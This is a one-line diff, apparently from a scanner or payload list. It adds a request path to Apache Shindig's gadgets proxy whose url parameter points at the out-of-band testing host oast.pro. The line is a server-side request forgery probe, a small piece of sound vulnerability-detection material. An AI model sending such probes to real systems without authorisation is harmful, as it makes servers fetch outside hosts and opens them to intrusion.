@@ -1,0 +1,1 @@
+/shindig/gadgets/proxy?container=default&url=http://oast.pro
